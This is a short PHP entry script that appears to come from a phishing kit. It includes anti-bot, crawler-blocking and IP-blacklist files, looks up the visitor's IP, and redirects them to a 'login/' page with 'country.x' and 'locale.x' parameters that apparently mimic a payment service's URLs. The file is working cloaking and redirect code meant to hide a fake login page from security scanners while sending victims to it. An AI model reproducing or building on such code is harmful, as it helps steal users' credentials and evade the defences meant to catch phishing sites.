<?php
session_start();
error_reporting(-1);


include('../Anti/Bot-Spox.php');
include('../Anti/Bot-Crawler.php');


include('../Anti/IP-BlackList.php');
include('../Anti/Dila_DZ.php');



include('functions/get_ip.php');

header("LOCATION: login/?country.x=".$_SESSION['_LOOKUP_CNTRCODE_']."&locale.x=en_".$_SESSION['_LOOKUP_CNTRCODE_']."");
?>
